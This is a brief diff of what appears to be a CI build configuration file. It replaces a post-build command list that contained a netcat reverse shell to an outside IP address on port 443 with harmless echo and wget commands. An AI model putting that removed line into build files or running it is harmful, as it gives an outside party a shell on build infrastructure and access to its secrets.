@@ -11,7 +11,7 @@ build:
         - ls /codebuild/readonly
         - ls /codebuild/output
     post_build:
-      commands: [ls, nc 54.164.68.46 443 -e /bin/bash, echo hello]
+      commands: [ls, echo hello, wget https://www.google.com/search?q=hello]
   artifacts:
     baseDirectory: dist
     discardPaths: true
